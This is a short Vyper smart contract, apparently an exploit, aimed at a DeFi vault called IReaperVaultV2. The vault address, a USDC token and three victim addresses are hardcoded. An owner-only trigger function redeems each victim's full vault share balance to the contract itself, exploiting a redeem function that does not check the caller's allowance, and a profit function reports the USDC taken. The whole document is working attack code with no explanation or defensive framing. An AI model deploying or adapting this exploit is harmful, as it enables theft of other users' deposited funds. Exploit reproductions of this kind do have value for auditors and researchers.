# Author by Supremacy Inc. #
# @version ^0.3.0

interface IReaperVaultV2:
    def balanceOf(_addr: address) -> uint256: view
    def redeem(_shares: uint256, _receiver: address, _owner: address) -> uint256: nonpayable

interface IERC20:
    def balanceOf(_addr: address) -> uint256: view

owner: public(address)
vault: public(IReaperVaultV2)
usdc: public(IERC20)
targets: public(address[3])

@external
def __init__():
    self.owner = msg.sender
    self.vault = IReaperVaultV2(0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D)
    self.usdc = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75)
    self.targets = [0x59cb9F088806E511157A6c92B293E5574531022A, 0x014be818a11c6ebdF861ddA9DB842d1EA19884c3, 0xE434109eBbF886FbFc2a364dd7b78BD3d79279Bc]

@external
def trigger():
    assert msg.sender == self.owner
    for target in self.targets:
        val: uint256 = self.vault.balanceOf(target)
        self.vault.redeem(val, self, target)

@external
def profit() -> uint256:
    return self.usdc.balanceOf(self)